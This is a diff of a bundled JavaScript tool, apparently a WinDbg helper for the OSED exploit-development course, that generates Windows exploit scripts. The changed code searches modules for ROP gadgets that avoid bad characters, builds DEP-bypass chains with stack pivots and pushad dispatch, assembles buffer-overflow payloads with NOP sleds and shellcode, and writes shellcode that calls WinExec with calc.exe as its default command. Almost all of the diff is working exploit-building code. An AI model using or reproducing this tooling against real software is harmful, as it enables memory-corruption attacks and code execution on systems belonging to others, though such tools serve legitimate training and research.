+          return to(input.jmpEsp === void 0 ? void 0 : constVal(input.jmpEsp, ref(row(input.jmpEsp, "jmp esp", "return into the stack"))), `no jmp esp or call esp without bad bytes in ${input.module}: dx @$osed().find_bytes("${input.module}", "FF E4", 20)`);
         case "skip3": {
-          const skip = rankCandidates(gadgets.filter((gadget) => !movesEsp(gadget) && extraPops(gadget, 0) === 3 && lastRetN(gadget) === 0 && memoryWrites(gadget, "").length === 0))[0];
-          const pop = popGadget(register2, keep);
-          if (!skip || !pop)
-            return missing(`no gadget that skips three dwords, like add esp, 0xC ; ret: dx @$osed().add_esp("${input.module}")`);
-          return [{ call: entry(pop, `load ${register2}`, 1), values: [ref(row(gadgetAddress(skip), sequence(skip), "skip three dwords"))] }];
+          const skip = skipper();
+          return to(skip ? constVal(gadgetAddress(skip), ref(row(gadgetAddress(skip), sequence(skip), "skip three dwords"))) : void 0, `no gadget that skips three dwords, like add esp, 0xC ; ret: dx @$osed().add_esp("${input.module}")`);
         }
         case "size": {
           const pop = popGadget(register2, keep);
           if (!negate || negate.at.dest !== register2 || !pop)
-            return missing(`no pop and neg for ${register2}`);
-          return [{ call: entry(pop, `load ${register2}`, 1), values: ["neg(size)"] }, { call: entry(negate.gadget, "negate"), values: [] }];
+            return missing(`no pop and neg for ${register2}: the size is negated at run time, so it needs both in ${register2}`);
+          say(register2, slot2.name, "chosen at run time", `POP then NEG, the only load the search does not own: the script grows size until neg(size) is clean`, "popped negated, then negated back");
+          return [
+            { call: entry(pop, `load ${register2}`, 1), values: ["neg(size)"], note: `${register2} = neg(size), kept clean by the loop above` },
+            { call: entry(negate.gadget, "negate"), values: [], note: `${register2} = -${register2}, now size` }
+          ];
         }
         case "shellcode": {
           const math = arithmetic(register2, keep);
           const move = moveOps(field, register2, keep);
           if (style !== "skeleton" || !math || !move) {
-            return missing(style === "skeleton" ? `no gadget adds a popped distance to ${register2}` : `the shellcode's address on the stack, so this dword needs a write before the pushad: bp <pushad gadget> ; g ; s -b esp L400${" 90".repeat(16)}`);
+            return missing(style === "skeleton" ? `no gadget adds a popped distance to ${register2}` : `the shellcode's address on the stack, so this dword needs a write before the pushad: bp ${pick2("pushad") ? hex6(gadgetAddress(pick2("pushad").gadget)) : "<pushad gadget>"} ; g ; s -b esp L400${" 90".repeat(16)}`);
           }
           return [...move, { line: "c.patches.append((len(c) + 1 + c.skip // 4, field))" }, { call: math.pop, values: ["0"] }, { call: math.op, values: [] }];
         }
@@ -15383,9 +16237,14 @@ var osed_bundle = (() => {
     const defineLoader = (slot2, register2, keep) => {
       const fn = `load_${ident(slot2.name)}`;
       const params = slot2.source.kind === "shellcode" ? "c, field" : slot2.source.kind === "size" ? "c, size" : "c";
-      loaders.push({ line: `def ${fn}(${params}):${" ".repeat(Math.max(1, 28 - fn.length - params.length))}# ${register2} = ${slot2.name}` });
+      loaders.push({ line: `def ${fn}(${params}):${" ".repeat(Math.max(1, 34 - fn.length - params.length))}# ${register2} = ${slot2.name}` });
+      const holesBefore = holes.length;
       for (const op5 of load(slot2, register2, keep))
         loaders.push("call" in op5 ? op5 : { line: op5.line });
+      if (said.indexOf(fn) < 0) {
+        const why = holes.length > holesBefore ? holes[holesBefore].slice(holes[holesBefore].indexOf(": ") + 2) : "built from the frame, not searched for";
+        say(register2, slot2.name, "no value to search for", `not searched: ${why}`, `not searched: ${why}`);
+      }
       return fn;
     };
     let frameBlock = [];
@@ -15394,7 +16253,7 @@ var osed_bundle = (() => {
       const frame = FRAMES[api];
       const literal2 = (slot2) => {
         if (slot2.source.kind === "const" && isClean(slot2.source.value, badchars))
-          return hex5(slot2.source.value);
+          return hex6(slot2.source.value);
         if (slot2.source.kind !== "named")
           return void 0;
         const value = slot2.source.name === "WRITABLE" ? input.writable : input.cave;
@@ -15404,7 +16263,7 @@ var osed_bundle = (() => {
       frameBlock = [
         ...frame.map((slot2, i) => {
           var _a3;
-          const value = (_a3 = literal2(slot2)) != null ? _a3 : hex5(dummies[i]);
+          const value = (_a3 = literal2(slot2)) != null ? _a3 : hex6(dummies[i]);
           return `frame ${i === 0 ? " =" : "+="} p32(${value})${" ".repeat(Math.max(1, 14 - value.length))}# ${slot2.name}${literal2(slot2) ? "" : ", patched by the chain"}`;
         }),
         "FRAME_AT = OFFSET - len(frame)     # field 1 sits here, so the chain starts on EIP"
@@ -15414,12 +16273,12 @@ var osed_bundle = (() => {
       } else {
         const fns = frame.map((slot2) => literal2(slot2) ? void 0 : defineLoader(slot2, valueRegister, [field]));
         chain.push(group("the captured ESP, and the address of field 1"));
-        chain.push({ line: `# ${field} = field 1 - ${hex5(writeOffset)}: the captured ESP is buffer offset OFFSET + 4, field 1 is FRAME_AT` });
-        chain.push({ line: `# confirm: bp ${hex5(gadgetAddress(capture.gadget))} ; g ; r esp ; s -d esp-400 L100 45454545` });
+        chain.push({ line: `# ${field} = field 1 - ${hex6(writeOffset)}: the captured ESP is buffer offset OFFSET + 4, field 1 is FRAME_AT` });
+        chain.push({ line: `# confirm: bp ${hex6(gadgetAddress(capture.gadget))} ; g ; r esp ; s -d esp-400 L100 45454545` });
         chain.push({ call: entry(capture.gadget, "capture ESP"), values: [] });
         const distance = popGadget((_e = add.at.source) != null ? _e : "", [(_f = capture.at.dest) != null ? _f : ""]);
         if (distance)
-          chain.push({ call: entry(distance, `load ${add.at.source}`, 1), values: [`neg(OFFSET + 4 - FRAME_AT${writeOffset ? ` + ${hex5(writeOffset)}` : ""})`] });
+          chain.push({ call: entry(distance, `load ${add.at.source}`, 1), values: [`neg(OFFSET + 4 - FRAME_AT${writeOffset ? ` + ${hex6(writeOffset)}` : ""})`] });
         else
           chain.push(...hole("distance", `no pop ${add.at.source} for the distance to field 1`));
         chain.push({ call: entry(add.gadget, "add the distance to field 1"), values: [] });
@@ -15441,6 +16300,8 @@ var osed_bundle = (() => {
             at = i;
           }
           const args = slot2.source.kind === "shellcode" ? `c, ${i + 1}` : slot2.source.kind === "size" ? "c, size" : "c";
+          if (briefs[fn])
+            chain.push({ line: `# ${briefs[fn]}` });
           chain.push({ line: `${fn}(${args})` });
           chain.push({ call: entry(write2.gadget, "write the field"), values: [] });
         });
@@ -15450,7 +16311,7 @@ var osed_bundle = (() => {
         const math = arithmetic(valueRegister, []);
         const toPivot = moveOps(valueRegister, (_g = pivot.at.source) != null ? _g : "", []);
         chain.push(group("pivot: ESP onto field 1"));
-        chain.push({ line: `# ${pivot.at.source} = field 1 - ${hex5(4 * pops)}, so the ret after the pivot lands on field 1` });
+        chain.push({ line: `# ${pivot.at.source} = field 1 - ${hex6(4 * pops)}, so the ret after the pivot lands on field 1` });
         if (!toValue || !math || !toPivot)
           chain.push(...hole("pivot_value", `no way to move the field address into ${pivot.at.source}`));
         else {
@@ -15461,10 +16322,24 @@ var osed_bundle = (() => {
         }
         chain.push({ call: entry(pivot.gadget, "pivot ESP onto field 1"), values: [] });
         const sub = ((_h = arithmetic(valueRegister, [field])) == null ? void 0 : _h.sub) !== false;
-        chain.push({ line: "" }, group("the shellcode address, into the fields the loaders marked"), { line: "chain_end = OFFSET + 4 * len(c)" }, { line: `def to_sled(field, gap):        # what the pop before the ${sub ? "sub" : "add"} needs, so the value lands on the NOPs` }, { line: `    distance = chain_end + gap - (FRAME_AT + 4 * (field - 1)${writeOffset ? ` - ${hex5(writeOffset)}` : ""})` }, { line: `    return ${sub ? "neg(distance)" : "distance"}` }, { line: "gap = 0x40" }, { line: "while not all(clean(to_sled(f, gap)) for _, f in c.patches): gap += 1" }, { line: "for at, f in c.patches: c[at] = to_sled(f, gap)" }, { line: "" }, { line: 'payload  = b"A" * FRAME_AT + frame + b"".join(p32(w) for w in c)' }, { line: 'payload += b"C" * gap + nops + shellcode' });
+        chain.push({ line: "" }, group("the shellcode address, into the fields the loaders marked"), { line: "chain_end = OFFSET + 4 * len(c)" }, { line: `def to_sled(field, gap):        # what the pop before the ${sub ? "sub" : "add"} needs, so the value lands on the NOPs` }, { line: `    distance = chain_end + gap - (FRAME_AT + 4 * (field - 1)${writeOffset ? ` - ${hex6(writeOffset)}` : ""})` }, { line: `    return ${sub ? "neg(distance)" : "distance"}` }, { line: "gap = 0x40" }, { line: "while not all(clean(to_sled(f, gap)) for _, f in c.patches): gap += 1" }, { line: "for at, f in c.patches: c[at] = to_sled(f, gap)" }, { line: "" }, { line: 'payload  = b"A" * FRAME_AT + frame + b"".join(p32(w) for w in c)' }, { line: 'payload += b"C" * gap + nops + shellcode' });
       }
     } else {
-      const slots = PUSHAD_FRAMES[api];
+      let slots = PUSHAD_FRAMES[api].slice();
+      for (let tries = 0; tries < slots.length; tries += 1) {
+        const kept = [];
+        const stuck = slots.find((slot2) => {
+          var _a3;
+          const register2 = (_a3 = slot2.register) != null ? _a3 : "eax";
+          const goal = goalOf(slot2);
+          const blocked2 = goal !== void 0 && kept.length > 0 && !isPath(reachPath(register2, goal, kept)) && isPath(reachPath(register2, goal, []));
+          kept.push(register2);
+          return blocked2;
+        });
+        if (!stuck)
+          break;
+        slots = [stuck, ...slots.filter((slot2) => slot2 !== stuck)];
+      }
       const loaded = [];
       const order = slots.map((slot2) => {
         var _a3, _b2;
@@ -15475,6 +16350,8 @@ var osed_bundle = (() => {
       frameBlock = [`PUSHAD_ORDER = [${order.join(", ")}]`, `# ${slots.map((slot2) => `${slot2.register} = ${slot2.name}`).join(", ")}`];
       const dispatch = pick2("pushad");
       chain.push(group("the seven registers, in the order [6/7] fixes"));
+      for (const fn of order)
+        chain.push({ line: `# ${(_i = briefs[fn]) != null ? _i : fn}` });
       chain.push({ line: "for load in PUSHAD_ORDER: load(c)" });
       chain.push(group("dispatch: pushad writes the whole frame at once"));
       if (dispatch && sequence(dispatch.gadget) !== "pushad ; ret") {
@@ -15488,7 +16365,7 @@ var osed_bundle = (() => {
       for (const slot2 of PUSHAD_TAIL[api]) {
         const known = slot2.source.kind === "named" && (slot2.source.name === "WRITABLE" ? input.writable : input.cave) !== void 0;
         if (slot2.source.kind === "const")
-          tail.push(hex5(slot2.source.value));
+          tail.push(hex6(slot2.source.value));
         else if (slot2.source.kind === "named" && known)
           tail.push(slot2.source.name);
         else {
@@ -15509,7 +16386,8 @@ var osed_bundle = (() => {
       if ("line" in op5)
         return op5.line === "" ? "" : `${indent}${resolve(op5.line)}`;
       const call = `c.rop(${[op5.call.name, ...op5.values.map(resolve)].join(", ")})`;
-      return `${indent}${op5.times && op5.times > 1 ? `for _ in range(${op5.times}): ${call}` : call}`;
+      const line = `${indent}${op5.times && op5.times > 1 ? `for _ in range(${op5.times}): ${call}` : call}`;
+      return op5.note ? `${line}${" ".repeat(Math.max(2, 44 - line.length))}# ${resolve(op5.note)}` : line;
     });
     const loaderLines = render(loaders, "    ").map((line) => line.indexOf("    def ") === 0 ? line.slice(4) : line);
     const width = Math.max(0, ...table2.map((entry2) => entry2.name.length));
@@ -15521,7 +16399,7 @@ var osed_bundle = (() => {
       table: table2,
       stages,
       holes: slot.hole ? [slot.hole, ...holes] : holes,
-      recipes,
+      routes: routes.map(resolve),
       blocks: {
         1: HELPER_BLOCK,
         2: slot.block,
@@ -15530,13 +16408,13 @@ var osed_bundle = (() => {
           ...table2.flatMap((entry2) => {
             var _a3;
             return [
-              `${entry2.name.padEnd(width)} = ${hex5(entry2.address)}   # ${entry2.sequence}${warnings[entry2.address] ? `   <<< ${warnings[entry2.address]}` : byAddress[entry2.address] && far(byAddress[entry2.address]) ? `   <<< takes 0x${((_a3 = stackMove(byAddress[entry2.address])) != null ? _a3 : 0).toString(16)} bytes of stack: c.rop pads that much junk into the payload` : ""}`,
-              ...swapsFor(entry2.address, entry2.loads).map((swap) => `# ${entry2.name.padEnd(width - 2)} = ${hex5(swap.address)}   # ${swap.sequence}   drop-in swap, ranked lower: ${swap.why}`)
+              `${entry2.name.padEnd(width)} = ${hex6(entry2.address)}   # ${entry2.sequence}${warnings[entry2.address] ? `   <<< ${warnings[entry2.address]}` : byAddress[entry2.address] && far(byAddress[entry2.address]) ? `   <<< takes 0x${((_a3 = stackMove(byAddress[entry2.address])) != null ? _a3 : 0).toString(16)} bytes of stack: c.rop pads that much junk into the payload` : ""}`,
+              ...swapsFor(entry2.address, entry2.loads).map((swap) => `# ${entry2.name.padEnd(width - 2)} = ${hex6(swap.address)}   # ${swap.sequence}   drop-in swap, ranked lower: ${swap.why}`)
             ];
           }),
           `COST = {${[
             ...cost.map((entry2) => `${entry2.name}: (${entry2.pops}, ${entry2.retn ? `0x${entry2.retn.toString(16)}` : 0})`),
-            ...table2.flatMap((entry2) => swapsFor(entry2.address, entry2.loads).filter((swap) => swap.pops > 0 || swap.retn > 0).map((swap) => `${hex5(swap.address)}: (${swap.pops}, ${swap.retn ? `0x${swap.retn.toString(16)}` : 0})`))
+            ...table2.flatMap((entry2) => swapsFor(entry2.address, entry2.loads).filter((swap) => swap.pops > 0 || swap.retn > 0).map((swap) => `${hex6(swap.address)}: (${swap.pops}, ${swap.retn ? `0x${swap.retn.toString(16)}` : 0})`))
           ].join(", ")}}     # (extra pops, ret N). The swap-ins are here too, so swapping one in needs no other edit.`,
           "",
           "class Chain(list):                # c.rop(gadget, values): the gadget, junk for the last ret N, its values, junk for its extra pops",
@@ -15547,8 +16425,8 @@ var osed_bundle = (() => {
           "        self.skip, self.patches = retn, self.patches or []"
         ] },
         5: { lines: [
-          ...input.writable !== void 0 ? [`WRITABLE = ${hex5(input.writable)}     # writable dword, code_caves STAGING`] : [],
-          ...input.cave !== void 0 ? [`CAVE = ${hex5(input.cave)}     # executable cave, code_caves EXEC`] : [],
+          ...input.writable !== void 0 ? [`WRITABLE = ${hex6(input.writable)}     # writable dword, code_caves STAGING`] : [],
+          ...input.cave !== void 0 ? [`CAVE = ${hex6(input.cave)}     # executable cave, code_caves EXEC`] : [],
           ...loaderLines
         ] },
         6: { lines: frameBlock },
@@ -15568,9 +16446,9 @@ var osed_bundle = (() => {
   }
 
   // src/commands/palette.ts
-  var REGS3 = ["eax", "ecx", "edx", "ebx", "esp", "ebp", "esi", "edi"];
-  var GENERAL = REGS3.filter((reg) => reg !== "esp");
-  var num = (reg) => REGS3.indexOf(reg);
+  var REGS4 = ["eax", "ecx", "edx", "ebx", "esp", "ebp", "esi", "edi"];
+  var GENERAL = REGS4.filter((reg) => reg !== "esp");
+  var num = (reg) => REGS4.indexOf(reg);
   var rm2 = (mod, reg, base) => mod << 6 | num(reg) << 3 | num(base);
   var up = (reg) => reg.toUpperCase();
   var two = (op5, src, dst, bodies) => ({ name: `GADGET_${op5}_${up(src)}2${up(dst)}`, op: op5, src, dst, bodies });
@@ -15582,7 +16460,7 @@ var osed_bundle = (() => {
     ...GENERAL.map((dst) => two("MOV", "esp", dst, [[84, 88 + num(dst)], [137, rm2(3, "esp", dst)], [139, rm2(3, dst, "esp")]])),
     ...pairs2(GENERAL).map(([src, dst]) => two("MOV", src, dst, [[137, rm2(3, src, dst)], [139, rm2(3, dst, src)]])),
     ...GENERAL.map((src) => two("MOV", src, "esp", [[137, rm2(3, src, "esp")], [139, rm2(3, "esp", src)]])),
-    ...pairs2(REGS3).filter(([a, b]) => num(a) < num(b)).map(([a, b]) => two("XCHG", a, b, [...a === "eax" ? [[144 + num(b)]] : [], [135, rm2(3, a, b)], [135, rm2(3, b, a)]])),
+    ...pairs2(REGS4).filter(([a, b]) => num(a) < num(b)).map(([a, b]) => two("XCHG", a, b, [...a === "eax" ? [[144 + num(b)]] : [], [135, rm2(3, a, b)], [135, rm2(3, b, a)]])),
     ...pairs2(GENERAL).map(([src, dst]) => two("ADD", src, dst, [[1, rm2(3, src, dst)], [3, rm2(3, dst, src)]])),
     ...pairs2(GENERAL).map(([src, dst]) => two("SUB", src, dst, [[41, rm2(3, src, dst)], [43, rm2(3, dst, src)]])),
     ...GENERAL.map((dst) => one("NEG", dst, [[247, 216 + num(dst)]])),
@@ -17180,8 +18058,8 @@ var osed_bundle = (() => {
     return chars.join("");
   }
   function toDmlAddress(address, command2) {
-    const hex9 = `0x${address.toString(16).toUpperCase()}`;
-    return `<link cmd="${command2} ${hex9}">${hex9}</link>`;
+    const hex10 = `0x${address.toString(16).toUpperCase()}`;
+    return `<link cmd="${command2} ${hex10}">${hex10}</link>`;
   }
   function toDmlModule(name) {
     var _a2;
@@ -18278,11 +19156,11 @@ if __name__ == "__main__":
 `;
 
   // src/shellcode/writer.ts
-  var REGS4 = ["eax", "ecx", "edx", "ebx", "esp", "ebp", "esi", "edi"];
+  var REGS5 = ["eax", "ecx", "edx", "ebx", "esp", "ebp", "esi", "edi"];
   var SCRATCH = ["eax", "ecx", "edx"];
-  var regIndex = (reg) => REGS4.indexOf(reg);
-  var isReg = (value) => REGS4.includes(value);
-  var hex6 = (value) => `0x${(value >>> 0).toString(16)}`;
+  var regIndex = (reg) => REGS5.indexOf(reg);
+  var isReg2 = (value) => REGS5.includes(value);
+  var hex7 = (value) => `0x${(value >>> 0).toString(16)}`;
   var hex326 = (value) => `0x${(value >>> 0).toString(16).padStart(8, "0")}`;
   var fitsImm8 = (value) => (value | 0) >= -128 && (value | 0) <= 127;
   function le32(value) {
@@ -18295,12 +19173,12 @@ if __name__ == "__main__":
   var ALU_EXT = { add: 0, sub: 5, xor: 6 };
   var x86 = {
     pushImm: (value) => ({
-      asm: `push ${hex6(value)}`,
+      asm: `push ${hex7(value)}`,
       bytes: fitsImm8(value) ? [106, value & 255] : [104, ...le32(value)]
     }),
     pushReg: (reg) => ({ asm: `push ${reg}`, bytes: [80 + regIndex(reg)] }),
     popReg: (reg) => ({ asm: `pop ${reg}`, bytes: [88 + regIndex(reg)] }),
-    movImm: (reg, value) => ({ asm: `mov ${reg}, ${hex6(value)}`, bytes: [184 + regIndex(reg), ...le32(value)] }),
+    movImm: (reg, value) => ({ asm: `mov ${reg}, ${hex7(value)}`, bytes: [184 + regIndex(reg), ...le32(value)] }),
     movReg: (dst, src) => ({ asm: `mov ${dst}, ${src}`, bytes: [137, 192 | regIndex(src) << 3 | regIndex(dst)] }),
     zero: (op5, reg) => ({
       asm: `${op5} ${reg}, ${reg}`,
@@ -18311,7 +19189,7 @@ if __name__ == "__main__":
     alu: (op5, reg, value) => {
       const ext = ALU_EXT[op5] << 3;
       const bytes = fitsImm8(value) ? [131, 192 | ext | regIndex(reg), value & 255] : reg === "eax" ? [5 | ext, ...le32(value)] : [129, 192 | ext | regIndex(reg), ...le32(value)];
-      return { asm: `${op5} ${reg}, ${hex6(value)}`, bytes };
+      return { asm: `${op5} ${reg}, ${hex7(value)}`, bytes };
     },
     pushFrame: (disp) => ({ asm: `push ${frameOperand(disp)}`, bytes: [255, 117, disp & 255] }),
     callFrame: (disp) => ({ asm: `call ${frameOperand(disp)}`, bytes: [255, 85, disp & 255] }),
@@ -18421,7 +19299,7 @@ if __name__ == "__main__":
         return { kind: "number", value: (negative ? -magnitude : magnitude) >>> 0 };
     }
     const lower = text.toLowerCase();
-    if (isReg(lower))
+    if (isReg2(lower))
       return { kind: "register", reg: lower };
     const frame = /^(?:dword\s+ptr\s*)?\[\s*ebp\s*([+-])\s*(0x[0-9a-f]+|\d+)\s*\]$/i.exec(text);
     if (frame) {
@@ -18435,7 +19313,7 @@ if __name__ == "__main__":
     if (arg.kind === "register")
       return [arg.reg];
     if (arg.kind === "expr")
-      return REGS4.filter((reg) => new RegExp(`\\b${reg}\\b`, "i").test(arg.text));
+      return REGS5.filter((reg) => new RegExp(`\\b${reg}\\b`, "i").test(arg.text));
     return arg.kind === "frame" ? ["ebp"] : [];
   }
   function callFrame(api, rawArgs, bad) {
@@ -18539,7 +19417,7 @@ if __name__ == "__main__":
   function parseTemplateArgs(tokens) {
     const tasks = [];
     let badchars = [0];
-    let show = 1;
+    let show2 = 1;
     for (const raw of tokens) {
       const token = raw.trim();
       const eq = token.indexOf("=");
@@ -18553,9 +19431,9 @@ if __name__ == "__main__":
       } else if (key2 === "show") {
         if (!/^\d+$/.test(value.trim()))
           return { ok: false, error: `show takes a number such as 0 (SW_HIDE) or 1 (SW_SHOWNORMAL), not "${value}".` };
-        show = Number(value.trim());
+        show2 = Number(value.trim());
       } else if (key2 === "winexec" && value) {
-        tasks.push({ kind: "winexec", command: value, show });
+        tasks.push({ kind: "winexec", command: value, show: show2 });
       } else if (key2 === "loadlibrary" && value) {
         tasks.push({ kind: "loadlibrary", dll: value.trim() });
       } else if (key2 === "getprocaddress" && value) {
@@ -18569,7 +19447,7 @@ if __name__ == "__main__":
       }
     }
     if (tasks.length === 0)
-      tasks.push({ kind: "winexec", command: "calc.exe", show }, { kind: "exitprocess" });
+      tasks.push({ kind: "winexec", command: "calc.exe", show: show2 }, { kind: "exitprocess" });
     return { ok: true, tasks, badchars };
   }
   var op4 = (asm, note) => ({ asm, note });
@@ -21647,7 +22525,7 @@ ${SC_BUILDER_SOURCE.slice(end)}` };
       return "value" in self2 ? String(self2.value) : String(self2.success);
     }
   };
-  function hex7(value) {
+  function hex8(value) {
     return value < 0 ? `-0x${(-value).toString(16).toUpperCase()}` : `0x${value.toString(16).toUpperCase()}`;
   }
   function toPlainNumber(value) {
@@ -21661,10 +22539,10 @@ ${SC_BUILDER_SOURCE.slice(end)}` };
     if (typeof value === "number") {
       if (kind === "number")
         return String(value);
-      return kind === "address" || Math.abs(value) > 65535 ? hex7(value) : String(value);
+      return kind === "address" || Math.abs(value) > 65535 ? hex8(value) : String(value);
     }
     if (typeof value === "bigint")
-      return hex7(Number(value));
+      return hex8(Number(value));
     if (typeof value === "string")
       return value === "" ? "none" : stripDml(value);
     if (Array.isArray(value)) {
@@ -21683,7 +22561,7 @@ ${SC_BUILDER_SOURCE.slice(end)}` };
     if (typeof value === "string")
       return JSON.stringify(value);
     if (typeof value === "number")
-      return Math.abs(value) > 65535 ? hex7(value) : String(value);
+      return Math.abs(value) > 65535 ? hex8(value) : String(value);
     return String(value);
   }
   function readPath(source, path) {
@@ -22109,8 +22987,8 @@ ${INDENT}`)]);
     const text = value.trim().replace(/`/g, "");
     if (/^-?0x[0-9a-f]+$/i.test(text)) {
       const negative = text.startsWith("-");
-      const hex9 = negative ? text.slice(3) : text.slice(2);
-      const parsed = __bi(`0x${hex9}`);
+      const hex10 = negative ? text.slice(3) : text.slice(2);
+      const parsed = __bi(`0x${hex10}`);
       return negative ? -parsed : parsed;
     }
     if (/^-?[0-9]+$/.test(text)) {
@@ -22131,7 +23009,7 @@ ${INDENT}`)]);
     const signed = __bi.and(unsigned, signBit) !== __bi(0) ? unsigned - modulus : unsigned;
     const width = bits / 4;
     const byteCount = bits / 8;
-    const hex9 = `0x${unsigned.toString(16).toUpperCase().padStart(width, "0")}`;
+    const hex10 = `0x${unsigned.toString(16).toUpperCase().padStart(width, "0")}`;
     const littleEndianBytes = [];
     for (let i = 0; i < byteCount; i += 1) {
       const byte = Number(__bi.and(__bi.shr(unsigned, __bi(i * 8)), __bi(255)));
@@ -22140,11 +23018,11 @@ ${INDENT}`)]);
     return {
       input: typeof rawValue === "string" ? rawValue : value.toString(),
       bits,
-      hex: hex9,
+      hex: hex10,
       unsigned: unsigned.toString(),
       signed: signed.toString(),
       littleEndianBytes: littleEndianBytes.join(" "),
-      twosComplement: hex9
+      twosComplement: hex10
     };
   }
 
@@ -23471,7 +24349,7 @@ ${INDENT}`)]);
     const value = [...field.values.exact][0];
     return value > 0 ? "+" + value : String(value);
   }
-  function hex8(value, width) {
+  function hex9(value, width) {
     return "0x" + value.toString(16).toUpperCase().padStart(width, "0");
   }
   function pad2(value, width) {
@@ -23527,7 +24405,7 @@ ${INDENT}`)]);
         return ((_b2 = (_a3 = left.rva) != null ? _a3 : left.va) != null ? _b2 : __bi(-1)) < ((_d = (_c2 = right.rva) != null ? _c2 : right.va) != null ? _d : __bi(-1)) ? -1 : ((_f = (_e = left.rva) != null ? _e : left.va) != null ? _f : __bi(-1)) > ((_h = (_g = right.rva) != null ? _g : right.va) != null ? _h : __bi(-1)) ? 1 : left.instructions < right.instructions ? -1 : left.instructions > right.instructions ? 1 : 0;
       });
       const rendered = rows.map((row) => ({
-        va: row.va === void 0 ? "?" : hex8(row.va, addressWidth),
+        va: row.va === void 0 ? "?" : hex9(row.va, addressWidth),
         rva: row.rva === void 0 ? "?" : "+" + row.rva.toString(16).toUpperCase().padStart(Math.max(1, addressWidth - 2), "0"),
         instructions: row.instructions,
         capability: row.capability,
@@ -23540,7 +24418,7 @@ ${INDENT}`)]);
         capability: Math.max(10, ...rendered.map((row) => row.capability.length)),
         esp: Math.max(3, ...rendered.map((row) => row.esp.length))
       };
-      lines.push("", "MODULE: " + moduleName, "Base: " + ((metadata == null ? void 0 : metadata.base) === void 0 ? "?" : hex8(metadata.base, addressWidth)) + " | ASLR: " + ((metadata == null ? void 0 : metadata.aslr) === "enabled" ? "ON" : (metadata == null ? void 0 : metadata.aslr) === "disabled" ? "OFF" : "?") + " | Gadgets: " + rendered.length, "", pad2("VA", widths.va) + "  " + pad2("RVA", widths.rva) + "  " + pad2("INSTRUCTIONS", widths.instructions) + "  " + pad2("CAPABILITY", widths.capability) + "  ESP", "-".repeat(widths.va) + "  " + "-".repeat(widths.rva) + "  " + "-".repeat(widths.instructions) + "  " + "-".repeat(widths.capability) + "  " + "-".repeat(widths.esp), ...rendered.map((row) => pad2(row.va, widths.va) + "  " + pad2(row.rva, widths.rva) + "  " + pad2(row.instructions, widths.instructions) + "  " + pad2(row.capability, widths.capability) + "  " + row.esp));
+      lines.push("", "MODULE: " + moduleName, "Base: " + ((metadata == null ? void 0 : metadata.base) === void 0 ? "?" : hex9(metadata.base, addressWidth)) + " | ASLR: " + ((metadata == null ? void 0 : metadata.aslr) === "enabled" ? "ON" : (metadata == null ? void 0 : metadata.aslr) === "disabled" ? "OFF" : "?") + " | Gadgets: " + rendered.length, "", pad2("VA", widths.va) + "  " + pad2("RVA", widths.rva) + "  " + pad2("INSTRUCTIONS", widths.instructions) + "  " + pad2("CAPABILITY", widths.capability) + "  ESP", "-".repeat(widths.va) + "  " + "-".repeat(widths.rva) + "  " + "-".repeat(widths.instructions) + "  " + "-".repeat(widths.capability) + "  " + "-".repeat(widths.esp), ...rendered.map((row) => pad2(row.va, widths.va) + "  " + pad2(row.rva, widths.rva) + "  " + pad2(row.instructions, widths.instructions) + "  " + pad2(row.capability, widths.capability) + "  " + row.esp));
     }
     return lines.join("\n");
   }
@@ -23673,9 +24551,9 @@ ${INDENT}`)]);
         byByte.set(entry.byte, list);
       }
       const badSummary = [...byByte.entries()].map(([byte, positions]) => {
-        const hex9 = `0x${byte.toString(16).toUpperCase().padStart(2, "0")}`;
+        const hex10 = `0x${byte.toString(16).toUpperCase().padStart(2, "0")}`;
         const posStr = positions.length === 1 ? `offset ${positions[0]}` : positions.length === positions[positions.length - 1] - positions[0] + 1 ? `offsets ${positions[0]}-${positions[positions.length - 1]}` : `offsets ${positions.join(",")}`;
-        return `${hex9} (${posStr})`;
+        return `${hex10} (${posStr})`;
       }).join(", ");
       return `${mod.name} base ${baseHex} | packed: ${packed} | bad bytes: ${badSummary}. No usable gadget addresses.`;
     } catch (e) {
@@ -26453,13 +27331,13 @@ ${INDENT}`)]);
       var _a2;
       const encodings = [];
       const owners = groups.map((group) => group.map((encoding) => encodings.push(encoding) - 1));
-      const clean = badcharAddressFilter(badchars, 4);
+      const clean2 = badcharAddressFilter(badchars, 4);
       const known = new Set(((_a2 = scanned == null ? void 0 : scanned.gadgets) != null ? _a2 : []).map((gadget) => gadgetAddress(gadget)));
       const hits = [];
       const found = [];
       const dirty = encodings.map(() => 0);
       for (const module of modules) {
-        const search = findEncodings(module, encodings, (address) => clean.predicate({ address }), 8);
+        const search = findEncodings(module, encodings, (address) => clean2.predicate({ address }), 8);
         search.dirty.forEach((count, i) => {
           dirty[i] += count;
         });
@@ -26873,7 +27751,6 @@ ${INDENT}`)]);
         ({ plans, jmpEsp, missing } = printDepCandidates(solved, modules, badSet, style, exclude));
       } else
         error("Skipped: there is no corpus. See the STOP above.");
-      const solvable = corpus && exclude.length > 0 ? buildCapabilities(corpus.gadgets.filter((gadget) => exclude.indexOf(gadgetAddress(gadget)) < 0)) : corpus;
       const build = buildExploit({
         api: depApi,
         style,
@@ -26887,8 +27764,7 @@ ${INDENT}`)]);
         cave,
         jmpEsp,
         stage,
-        exclude,
-        solve: (register2, value, keep) => solvable ? solveValue(solvable, register2, value, badchars, keep, buildStableAddressPredicate()) : void 0
+        exclude
       });
       if (solved)
         printBlock(build.blocks[4]);
@@ -26923,6 +27799,11 @@ ${INDENT}`)]);
         else
           info(`Code cave (return address and lpBaseAddress) = ${hex325(cave)}, executable (code_caves EXEC).`);
       }
+      if (!blocker && build.routes.length > 0) {
+        info(`The recipes above build each constant in eax, as a reference. What the chain does is below: one line per register, searched through ${modulesLabel} rather than following one recipe.`);
+        for (const route2 of build.routes)
+          info(`  ${route2}`);
+      }
       if (!blocker)
         printBlock(build.blocks[5]);
       summary.push({ Section: `[5/${n}] constants`, Result: blocker ? "skipped" : `${CONSTANTS[depApi].length} recipes` });
@@ -26940,7 +27821,13 @@ ${INDENT}`)]);
       if (blocker) {
         error("Skipped: there is no chain to write. See the STOP above.");
       } else {
-        info(build.holes.length === 0 ? "Nothing left to measure: paste the seven blocks and the file runs." : `${build.holes.length} hole(s) to fill, each a hole(...) line with its command in the comment above it: ${build.holes.join("; ")}`);
+        if (build.holes.length === 0)
+          info("Nothing left to measure: paste the seven blocks and the file runs.");
+        else {
+          info(`${build.holes.length} hole(s) to fill, each a hole(...) line with the reason in the comment above it:`);
+          for (const hole of build.holes)
+            info(`  ${hole}`);
+        }
         printBlock(build.blocks[7]);
       }
